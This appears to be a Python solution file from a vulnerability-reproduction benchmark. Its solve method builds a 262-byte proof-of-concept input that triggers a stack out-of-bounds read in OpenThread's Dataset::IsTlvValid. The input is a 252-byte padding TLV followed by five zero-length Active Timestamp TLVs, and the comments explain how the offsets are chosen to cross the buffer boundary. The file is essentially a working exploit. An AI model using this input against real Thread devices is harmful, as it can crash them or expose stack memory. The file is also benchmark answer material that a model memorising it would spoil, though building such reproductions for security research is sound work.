import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in Dataset::IsTlvValid.
        
        The vulnerability allows Active Timestamp (Type 14) TLVs to be accepted even if their 
        length is less than the required 8 bytes. By providing a length of 0, we can induce 
        the parser to read 8 bytes from the buffer starting at the value offset.
        
        To cause a "Stack Buffer Overflow" (specifically an OOB read on the stack), we must 
        ensure that the read operation crosses the boundary of the stack-allocated buffer 
        used to hold the dataset. OpenThread datasets are typically handled in buffers of 
        around 254-256 bytes.
        
        We construct a payload of 262 bytes (matching ground truth) by padding the beginning 
        with a large ignored TLV, and placing the malicious malformed TLV at the end.
        """
        
        # 1. Padding TLV
        # Use an unknown/skippable TLV type (0x80) to advance the parser pointer 
        # near the end of the buffer.
        # Type: 0x80, Length: 250 (0xFA), Value: 250 bytes of zeros.
        # Total size: 1 (Type) + 1 (Len) + 250 (Value) = 252 bytes.
        padding = b'\x80\xfa' + b'\x00' * 250
        
        # 2. Malicious TLV
        # Active Timestamp (Type 14 / 0x0E) with Length 0.
        # The parser expects 8 bytes but we provide 0. Subsequent access reads OOB.
        malicious_tlv = b'\x0e\x00'
        
        # 3. Construct Payload
        # Append the malicious TLV multiple times (5 times = 10 bytes).
        # This covers offsets 252, 254, 256, 258, 260.
        # If the stack buffer is 254 or 256 bytes, one of these will align such that
        # the 8-byte read goes past the end of the buffer.
        # Total Length: 252 + 10 = 262 bytes.
        return padding + malicious_tlv * 5
